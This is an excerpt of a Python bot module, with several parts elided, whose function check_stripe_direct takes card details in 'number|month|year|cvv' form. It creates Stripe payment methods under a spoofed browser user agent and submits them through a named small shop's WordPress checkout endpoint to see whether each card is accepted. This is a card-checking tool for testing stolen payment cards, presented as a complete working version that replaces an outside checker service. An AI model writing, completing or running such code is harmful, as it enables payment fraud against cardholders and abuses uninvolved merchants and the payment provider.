# st_commands.py - COMPLETE WORKING VERSION WITH DIRECT STRIPE INTEGRATION
...
# --- Direct Stripe Check Function (Replaces API URL) ---
async def check_stripe_direct(card):
    """
    Direct Stripe checkout implementation from raw code.
    Replaces: API_URL = "https://BEASTXDxd.com/shopify/st7.php?site=dominileather.com&cc={card}"
    """
    try:
        # Parse card details
        parts = card.split("|")
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            ...
            registration_data = {
                ...
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            ...
            async with session.post('https://api.stripe.com/v1/payment_methods', 
                ...
                if not id_match:
                    return {"status": "Error", "message": "Could not retrieve payment method ID from Stripe"}
            ...
            async with session.post('https://bridgebooksdromore.co.uk/wp-admin/admin-ajax.php', 
                ...
                if "succeeded" in result_text:
                    ...
                    error_match = re.search(r'"message"\s*:\s*"([^"]+)"', full_response)
